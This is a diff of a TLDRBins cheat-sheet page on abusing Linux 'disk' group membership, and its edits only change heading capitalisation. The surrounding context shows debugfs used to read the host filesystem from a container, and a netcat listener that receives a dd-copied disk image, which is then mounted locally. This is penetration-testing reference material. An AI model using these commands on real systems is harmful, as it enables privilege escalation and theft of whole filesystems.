@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <meta name="description" content="">
-<title>disk group | TLDRBins</title>
+<title>Disk Group | TLDRBins</title>
 <link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
 </head>
 <body>
@@ -14,7 +14,7 @@
       <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
       <span>TLDRBins</span>
     </a><span class="hl"> / </span>
-    <a href="https://tldrbins.github.io/disk/"><span>disk group</span></a></h1>
+    <a href="https://tldrbins.github.io/disk/"><span>Disk Group</span></a></h1>
   <div class="theme-toggle-wrapper">
     <div class="theme-toggle">
       <div class="theme-toggle-track">
@@ -170,7 +170,7 @@
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-  <h3 id="basic">Basic</h3>
+  <h3 id="general">General</h3>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Show devices
 </span></span><span class="line"><span class="cl"><span class="go">lsblk
 </span></span></span></code><div class="output-bubble">Sample Output:
@@ -222,8 +222,8 @@
 </span></span></span><span class="line"><span class="cl"><span class="go">/dev/mapper/Kotarak--vg-swap_1 none            swap    sw              0       0
 </span></span></span><span class="line"><span class="cl"><span class="go">/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0
 </span></span></span></div></pre></div><hr>
-<h3 id="abuse-1-read-hosts-filesystem-from-container-root">Abuse #1: Read host’s filesystem from container (root)</h3>
-<h4 id="1-open-target-device">1. Open target device</h4>
+<h3 id="abuse-1-read-hosts-filesystem-from-container-root">Abuse #1: Read Host’s Filesystem from Container (root)</h3>
+<h4 id="1-open-target-device">1. Open Target Device</h4>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">debugfs /dev/sda1
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> debugfs /dev/sda1
@@ -243,8 +243,8 @@
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">(END)
 </span></span></span></div></pre></div><hr>
-<h3 id="abuse-2-read-containers-filesystem-from-host">Abuse #2: Read container’s filesystem from host</h3>
-<h4 id="1-show-lvm-mappings">1. Show LVM mappings</h4>
+<h3 id="abuse-2-read-containers-filesystem-from-host">Abuse #2: Read Container’s Filesystem from Host</h3>
+<h4 id="1-show-lvm-mappings">1. Show LVM Mappings</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ls -l /dev/mapper/
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> ls -l /dev/mapper/
@@ -252,7 +252,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="go">crw------- 1 root root 10, 236 Sep 22 23:22 control
 </span></span></span><span class="line"><span class="cl"><span class="go">lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-root -&gt; ../dm-0
 </span></span></span><span class="line"><span class="cl"><span class="go">lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-swap_1 -&gt; ../dm-1
-</span></span></span></div></pre></div><h4 id="2-exfil-containers-filesystem">2. Exfil container’s filesystem</h4>
+</span></span></span></div></pre></div><h4 id="2-exfil-containers-filesystem">2. Exfil Container’s Filesystem</h4>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> machine
 </span></span><span class="line"><span class="cl"><span class="go">nc -lvnp <span class="o editable-keyword">&lt;LOCAL_PORT&gt;</span> &gt; <span class="o editable-keyword">&lt;DEVICE_MAPPING&gt;</span>.gz
 </span></span></span></code><div class="output-bubble">Sample Output:
@@ -266,7 +266,7 @@
 </span></span><span class="line"><span class="cl"><span class="go">14680064+0 records in
 </span></span></span><span class="line"><span class="cl"><span class="go">14680064+0 records out
 </span></span></span><span class="line"><span class="cl"><span class="go">7516192768 bytes (7.5 GB, 7.0 GiB) copied, 306.697 s, 24.5 MB/s
-</span></span></span></div></pre></div><h4 id="3-mount-locally">3. Mount locally</h4>
+</span></span></span></div></pre></div><h4 id="3-mount-locally">3. Mount Locally</h4>
 <div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Extract dm-0
 </span></span><span class="line"><span class="cl"><span class="go">gunzip <span class="o editable-keyword">&lt;DEVICE_MAPPING&gt;</span>.gz
 </span></span></span></code><div class="output-bubble">Sample Output:
